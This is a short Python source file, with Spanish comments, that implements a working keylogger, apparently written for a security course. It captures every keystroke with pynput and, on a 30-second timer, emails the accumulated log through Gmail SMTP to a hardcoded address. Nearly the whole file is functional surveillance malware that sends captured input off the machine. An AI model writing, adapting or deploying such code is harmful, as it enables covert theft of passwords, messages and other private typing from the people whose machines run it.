# !/usr/bin/env python3
"""
keyloggerPython
"""


import dotenv
import os
import pynput.keyboard
import threading
import smtplib
from email.mime.text import MIMEText


class Keylogger:
    """
    Keylogger
    """

    def __init__(self):

        self.log = ""
        self.request_shutdown = False
        self.timer = None
        self.is_first_run = True

    def pressed_key(self, key):
        """
        Registra las teclas presionadas
        """

        try:

            self.log += str(key.char)

        except AttributeError:

            special_keys = {
                key.space: " ",
                key.enter: "\n",
                key.shift: " Shift ",
                key.shift_r: " Shift ",
                key.ctrl: " Ctrl ",
                key.ctrl_r: " Ctrl ",
                key.alt: " Alt ",
                key.alt_r: " Alt ",
                key.tab: " Tab ",
                key.cmd: " Cmd ",
                key.backspace: " Backspace ",
                key.caps_lock: " Caps Lock ",
                key.down: " Down ",
                key.up: " Up ",
                key.left: " Left ",
                key.right: " Right ",
                key.esc: " Esc "
            }

            self.log += special_keys.get(key, f" {str(key)} ")


    def send_email(self, subject, body, sender, recipients, password):
        """
        Envia un email con el reporte de teclas presionadas
        """

        msg = MIMEText(body)
        msg['Subject'] = subject
        msg['From'] = sender
        msg['To'] = ', '.join(recipients)

        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp_server:

            smtp_server.login(sender, password)
            smtp_server.sendmail(sender, recipients, msg.as_string())

        print(f"[i] Email sent Successfully!\n")

    def report(self):
        """
        Reporte de teclas presionadas por mail
        """

        dotenv.load_dotenv() 

        app_passwd = os.getenv("APP_PASSWD")

        email_body = "[+] El Keylogger se ha iniciado correctamente" if self.is_first_run else self.log
        self.send_email(
            "Keylogger Report",
            email_body,
            "keyloggerseginf@gmail.com",
            ["keyloggerseginf@gmail.com"],
            app_passwd
        )
        self.log = ""

        if self.is_first_run:

            self.is_first_run = False

        if not self.request_shutdown:

            self.timer = threading.Timer(30, self.report)
            self.timer.start()

    def shutdown(self):
        """
        Detiene el keylogger
        """

        self.request_shutdown = True

        if self.timer:

            self.timer.cancel()

    def start(self):
        """
        Inicia el keylogger
        """

        keyboard_listener = pynput.keyboard.Listener(on_press=self.pressed_key)

        with keyboard_listener:

            self.report()

            keyboard_listener.join()
